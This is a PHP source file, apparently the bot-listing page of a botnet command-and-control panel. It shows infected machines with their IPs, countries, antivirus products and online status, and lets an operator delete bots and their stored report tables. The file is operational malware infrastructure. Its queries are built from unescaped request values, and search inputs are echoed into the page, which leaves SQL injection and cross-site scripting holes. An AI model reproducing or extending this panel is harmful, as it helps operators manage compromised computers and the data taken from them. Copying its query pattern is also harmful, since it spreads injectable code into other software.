<?php

define("TPL_TITLE", "Bots");
define('PAGE_LIMIT', 10);
define('BOTS_LIMIT', 40);

define("SORT_BOT_ID", 0);
define("SORT_VER", 1);
define("SORT_IP", 2);
define("SORT_COUNTRY", 3);
define("SORT_ONLINE_TIME", 4);
define("SORT_AV", 5);

define("DELETE_BOTS", 0);
define("DELETE_BOTS_REPORTS", 1);

define("ASC", 0);
define("DESC", 1);

if (!CsrConnectToDb()) die();

if (isset($_POST['act']))
{
	$act = $_POST['act'];
	
	if (($act == DELETE_BOTS || $act == DELETE_BOTS_REPORTS) && isset($_POST["id"]))
	{ 
		$where = '';
		foreach ($_POST["id"] as $bot_id => $v) {
			$where .= "`bot_id` = \"" . $bot_id . "\" or ";
		}
		$where = substr($where, 0, -4);
		
		if ($act == DELETE_BOTS_REPORTS)
		{
			$tables = CsrListTables();
			foreach ($tables as $table) 
			{
				if (substr($table, 0, 8) == "reports_") 
				{
					foreach ($_POST["id"] as $bot_id => $v) CsrSqlQuery("delete from `" . $table . "` where " . $where . "");
				}
			}
		}
		CsrSqlQuery("delete from `bots` where " . $where . "");
	}
}

if (isset($_POST["delete"])) 
{
	$where = '';
	foreach ($_POST["delete"] as $bot_id => $v) {
		$where .= "`bot_id` = \"" . $bot_id . "\" or ";
	}
	$where = substr($where, 0, -4);
	CsrSqlQuery("delete from `bots` where " . $where);
}

$bots = array();
$where = '';
if (isset($_GET["search"]) && is_array($_GET["search"])) 
{
	$op = "=";
	
	foreach ($_GET["search"] as $k => $v) 
	{
		if (!empty($v)) 
		{
			$parts = explode(" ", trim($v));
			$field = '';
			
			if ($k == "bots") 
			{
				$op = "LIKE";
				$field = "bot_id";
				
				foreach ($parts as &$part) $part = str_replace("*", "%", $part);
			}
			else if ($k == "countries") $field = "country";
			else if ($k == "ip_addresses") {
				$field = "ipv4";
				foreach ($parts as &$part) $part = ip2long($part);
			}
			else if ($k == "nat_status") {
				$field = "nat";
				if ($parts[0] == "inside") $parts[0] = 1;
				else $parts[0] = 0;
			}
			else if ($k == "online_status") 
			{
				$field = "rtime_last";
				
				if ($v == "online") $op = ">=";
				else $op = "<";
				
				$parts[0] = CURRENT_TIME - ($config["bot_timeout"] * 60);
			}
			
			if (!empty($where))
				$where .= " and (";
			else
				$where .= " (";
				
			foreach ($parts as &$part) 
			{
				if ($op == "LIKE") {
					$where .= "`" . $field . "` " . $op . " " . (is_string($part) ? "\"" : "") . $part . (is_string($part) ? "\"" : "") . " or ";
				}
				else {
					$where .= "`" . $field . "` " . $op . " " . (is_string($part) ? "\"" : "") . $part . (is_string($part) ? "\"" : "") . " or ";
				}
			}
			
			$where = substr($where, 0, -4) . ")";
		}
	}
}

if ($where)
	$bots_count = CsrSqlQueryRowEx("select count(*) from `bots` where " . $where);
else
	$bots_count = CsrSqlQueryRowEx("select count(*) from `bots`");

if ($bots_count > 0) 
{
	$order_column = 'rtime_online';
	$t = 'desc';
	
	if (isset($_GET['sort'])) 
	{
		if ($_GET['sort'] == SORT_BOT_ID) $order_column = 'bot_id';
		else if ($_GET['sort'] == SORT_VER) $order_column = 'bot_version';
		else if ($_GET['sort'] == SORT_COUNTRY) $order_column = 'country';
		else if ($_GET['sort'] == SORT_IP) $order_column = 'ipv4';
		else if ($_GET['sort'] == SORT_AV) $order_column = 'av';
		else if ($_GET['sort'] == SORT_ONLINE_TIME) $order_column = 'rtime_online';
		
		if ($_GET['t'] == DESC) $t = 'asc';
	}

	$begin = CsrNavigationGetPage() * BOTS_LIMIT - BOTS_LIMIT;
	
	if ($order_column == 'rtime_online')
	{
		$bots = CsrSqlQueryRows("select `bot_id`, `bot_version`, `av`, `country`, `ipv4`, `rtime_last`, `rtime_online`, `nat`, `isOnline` 
															from 
														(select *, (" . CURRENT_TIME . " - `rtime_last`) <= (" . ($config['bot_timeout'] * 60) . ") as `isOnline`, (" . CURRENT_TIME . " - `rtime_online`) as `delta` from `bots` "  . (empty($where) ? "" : ("where " . $where)) . " order by `delta`) 
															a order by `isOnline` " . $t . " limit " . $begin . ", " . BOTS_LIMIT . "");
	}
	else
	{
		$bots = CsrSqlQueryRows("select `bot_id`, `bot_version`, `av`, `country`, `ipv4`, `rtime_last`, `rtime_online`, `nat` from bots " . (empty($where) ? "" : ("where " . $where)) . " order by `" . $order_column . "` " . $t . " limit " . $begin . ", " . BOTS_LIMIT . "");		
	}
}

ob_start();
?>

<form method='get' action="">
<input type='hidden' name='act' value='bots'/>
<div class="row">
	<div class="col-xs-7">
		<table class="table table-striped table-bordered table-condensed">
			<tr> 
				<th width='120px'> Bots </th> <td align='center'> <input class="form-control" type='text' name='search[bots]' value='<?=@$_GET["search"]["bots"] ?>'/> </td>
			</tr>
			<tr> 
				<th> Countries </th>  <td align='center'> <input class="form-control" type='text' name='search[countries]' value='<?=@$_GET["search"]["countries"] ?>'/> </td> 
			</tr>
			<tr> 
				<th> IP-addresses </th> <td align='center'> <input class="form-control" type='text' name='search[ip_addresses]' value='<?=@$_GET["search"]["ip_addresses"] ?>'/>  </td> 
			</tr>
		</table>
		<button class="btn btn-info btn-sm"> Filter </button>
	</div>

	<div class="col-xs-5">
		<table class="table table-striped table-bordered table-condensed">
			<tr> 
				<th> NAT status </th> 
				<td>  
					<select name='search[nat_status]'>
						<option value='' <?=empty($_GET["search"]["nat_status"]) ? "" : "selected" ?>> - </option>
						<option value='inside' <?=@$_GET["search"]["nat_status"] == "inside" ? "selected" : "" ?>> Inside NAT </option>
						<option value='outside' <?=@$_GET["search"]["nat_status"] == "outside" ? "selected" : "" ?>> Outside NAT </option>
					</select>
				</td> 
			</tr>
			<tr> 
				<th> Online status </th> 
				<td>  
					<select name='search[online_status]'>
						<option value='' <?=empty($_GET["search"]["online_status"]) ? "" : "selected" ?>> - </option>
						<option value='online' <?=@$_GET["search"]["online_status"] == "online" ? "selected" : "" ?>> Online </option>
						<option value='offline' <?=@$_GET["search"]["online_status"] == "offline" ? "selected" : "" ?>> Offline </option>
					</select>
				</td> 
			</tr>
		</table>
	</div>
	
</div>
</form>
<br/>


<? 

$uri = $_SERVER["REQUEST_URI"];
if (isset($_GET['t'])) {
	$uri = preg_replace("/&sort=(\d+)&t=(\d+)/", "", $uri);
}

?>

<? if (count($bots) > 0) { ?> 

<script type='text/javascript'>
var is_check = false;
function CheckAll() {
	is_check = !is_check;
	var elms = document.getElementsByClassName("bot_id");
	for (var i = 0; i < elms.length; ++i) elms[i].checked = is_check;
}
</script>

<form action="<?=$_SERVER["REQUEST_URI"]?>" method="post">
<div class="row">
	<div class="col-xs-12">
	<table class="table table-striped table-bordered table-condensed table-hover">
		<tr>
			<th width='300px'> <a href="<?=$uri?>&sort=<?=SORT_BOT_ID?>&t=<?=@((isset($_GET['t']) && isset($_GET['sort']) && $_GET['sort'] == SORT_BOT_ID) ? (int)!$_GET['t'] : ASC)?>"> Bot ID </a> </th> 
			<th> <a href="<?=$uri?>&sort=<?=SORT_VER?>&t=<?=@((isset($_GET['t']) && isset($_GET['sort']) && $_GET['sort'] == SORT_VER) ? (int)!$_GET['t'] : ASC)?>"> Version </a> </th> 
			<th width='150px'> <a href="<?=$uri?>&sort=<?=SORT_IP?>&t=<?=@((isset($_GET['t']) && isset($_GET['sort']) && $_GET['sort'] == SORT_IP) ? (int)!$_GET['t'] : ASC)?>"> IP </a></th> 
			<th width='100px'> <a href="<?=$uri?>&sort=<?=SORT_AV?>&t=<?=@((isset($_GET['t']) && isset($_GET['sort']) && $_GET['sort'] == SORT_AV) ? (int)!$_GET['t'] : ASC)?>"> Antivirus </a></th> 
			<th> <a href="<?=$uri?>&sort=<?=SORT_COUNTRY?>&t=<?=@((isset($_GET['t']) && isset($_GET['sort']) && $_GET['sort'] == SORT_COUNTRY) ? (int)!$_GET['t'] : ASC)?>"> Country </a> </th> 
			<th> <a href="<?=$uri?>&sort=<?=SORT_ONLINE_TIME?>&t=<?=@((isset($_GET['t']) && isset($_GET['sort']) && $_GET['sort'] == SORT_ONLINE_TIME) ? (int)!$_GET['t'] : ASC)?>"> Online time </a> </th> 
			<!-- <th> Online time </th> -->
			<th width='12px'> <input onclick="CheckAll()" type="checkbox"/> </th>
		</tr>
		<?php 
		for ($i = 0; $i < count($bots); ++$i) 
		{	
			if ($bots[$i]["rtime_last"] >= (CURRENT_TIME - $config["bot_timeout"] * 60)) {
				$tt = CURRENT_TIME - $bots[$i]["rtime_online"];	
				$bots[$i]["time_online"] = CsrGetTickTime($tt);
			}
			else {
				$bots[$i]["time_online"] = "--:--:--";
			}
			
			$bots[$i]["bot_version"] = CsrIntToVersion($bots[$i]["bot_version"]);
			$bots[$i]["bot_id"] = CsrHtmlEntitiesEx($bots[$i]["bot_id"]);
			?>
			<tr>
				<td><a target='_blank' href="<?=CORE_FILE?>?act=bot&id=<?=$bots[$i]["bot_id"]?>"> <?=$bots[$i]["bot_id"]?></a></td>
				<td><?=$bots[$i]["bot_version"]?></td>
				<td><?=long2Ip($bots[$i]["ipv4"])?> <?=($bots[$i]["nat"] == 1 ? " (NAT)" : "")?> </td>
				<td><?=CsrGetAv($bots[$i]["av"])?></td>
				<td><?=$bots[$i]["country"]?> <img src="template/img/country_16/<?=$bots[$i]["country"] == "--" ? "XX" : $bots[$i]["country"]?>.png"/></td>
				<td><?=$bots[$i]["time_online"]?></td>
				<td><input class='bot_id' name='id[<?=$bots[$i]["bot_id"]?>]' type="checkbox"/></td>
			</tr>
			<?php
		}
		?>
	</table>
	</div>
</div>

<div class="row">
	<div class="col-xs-12">
		<div class="row">
			<div class="col-xs-8">
				<ul class="pagination pagination-sm"> <?=CsrNavigation(preg_replace("/&page=(\d+)/", "", $_SERVER["REQUEST_URI"]), $bots_count, BOTS_LIMIT, PAGE_LIMIT)?> </ul>
			</div>
			<div class="col-xs-4">
				<select name='act' class="pull-right">
					<option> -- </option>
					<option value=<?=DELETE_BOTS?>> Remove bots from database </option>
					<option value=<?=DELETE_BOTS_REPORTS?>> Remove bots + reports from database </option>
				</select>
			<br> <br>
			<button class="btn btn-default btn-xs pull-right"> >> </button>
			</div>
		</div>
	</div>
</div>
</form>

<? } ?>

<?php
$content = ob_get_contents();
ob_end_clean();

$header_tpl = file_get_contents(TPL_PATH . "header.html");
$header_tpl = str_replace(array("{TPL}", "{SCRIPTS}", "{TITLE}"), array(TPL_PATH, "", TPL_TITLE), $header_tpl);

$menu_tpl = file_get_contents(TPL_PATH . "menu.html");
$menu_tpl = str_replace(array("{CORE_FILE}", "{CUR_TIME}", "{BOTS_ACTIVE}"), array(CORE_FILE, gmdate("M d Y H:i:s", mktime()), "active"), $menu_tpl);

$body_tpl = file_get_contents(TPL_PATH . "body.html");
$body_tpl = str_replace(array("{MENU}", "{BODY_CLASS}", "{CONTENT}"), array($menu_tpl, "bots", $content), $body_tpl);
$footer_tpl = file_get_contents(TPL_PATH . "footer.html");

echo str_replace(array("{HEADER}", "{BODY}", "{FOOTER}"), array($header_tpl, $body_tpl, $footer_tpl), file_get_contents(TPL_PATH . "main.html"));
?>